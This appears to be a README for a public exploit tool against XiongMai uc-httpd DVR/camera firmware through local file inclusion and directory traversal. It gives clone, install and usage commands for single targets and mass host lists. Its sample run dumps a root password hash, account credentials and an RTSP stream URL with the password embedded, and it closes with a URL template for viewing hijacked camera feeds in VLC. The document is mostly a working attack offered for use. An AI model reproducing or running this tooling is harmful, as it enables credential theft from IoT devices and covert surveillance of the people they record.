# xiongmai
Here is a live example of the exploit being ran:

# Quick start
```
anonymous@Anonymous:~$ git clone https://github.com/Thang4mat/xiongmai
anonymous@Anonymous:~$ cd xiongmai
anonymous@Anonymous:~$ pip3 install -r requirements.txt
```
```
anonymous@Anonymous:~$ python3 xiongmai-new.py

	[+]---------------------------------------------------------[+]
	| Vulnerable Software:      uc-httpd                          |
	| Vendor:                   XiongMai Technologies             |
	| Vulnerability Type:       LFI, Directory Traversal          |
	| Date Released:            03/04/2017                        |
	| Released by:              keksec                            |
	| Written by:               @Thang4mat                        |
	[+]---------------------------------------------------------[+]
    
[+] Usage:
Single host: python3 xiongmai-new.py 192.168.1.10
Multi host: python3 xiongmai-new.py list.txt
```

```
anonymous@Anonymous:~$ python3 xiongmai-new.py 192.168.1.10
    
Exploiting.....

 [+] Root (hashed):	b'root:absxcfbgXtb3o:0:0:root:/:/bin/sh\n'
 [+] Users List:	3
 [+] Monitors:		4 Channel(s)
 [+] RTSP URL:		rtsp://192.168.1.10:554/user=admin&password=tlJwpbo6&channel=1&stream=0.sdp
╭──────────────────────┬──────────────────────┬──────────────────────╮
│       Username       │  Password (hashed)   │        Group         │
├──────────────────────┼──────────────────────┼──────────────────────┤
│                admin │             tlJwpbo6 │                admin │
│                guest │             tlJwpbo6 │                 user │
│              default │             OxhlwSG8 │                 user │
╰──────────────────────┴──────────────────────┴──────────────────────╯
[+] Exported '192.168.1.10.passwd.txt','192.168.1.10.Account1.txt'
```
```
anonymous@Anonymous:~$ python3 xiongmai-new.py list.txt
    
All exploited host will be logged into the text file named "result.txt"

Exploiting.....

```
# VLC
```
rtsp://<target_ip>:554/user=<username>&password=<password>&channel=1&stream=0.sdp
```
